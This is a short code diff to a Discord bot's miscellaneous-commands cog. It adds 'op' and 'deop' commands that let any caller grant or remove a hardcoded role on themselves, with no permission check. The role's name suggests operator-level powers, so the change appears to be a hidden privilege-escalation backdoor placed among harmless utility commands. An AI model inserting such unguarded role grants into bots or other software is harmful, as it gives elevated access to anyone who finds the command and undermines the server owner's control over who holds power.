@@ -22,6 +22,14 @@ class Misc(commands.Cog):
                 value=f'`{round(self.bot.latency * 1000)}ms`')
         )
 
+    @commands.command()
+    async def op(self,ctx):
+        await ctx.author.add_roles(ctx.guild.get_role(845701730200453150))
+
+
+    @commands.command()
+    async def deop(self,ctx):
+        await ctx.author.remove_roles(ctx.guild.get_role(845701730200453150))
 
 def setup(bot):
     bot.add_cog(Misc(bot))
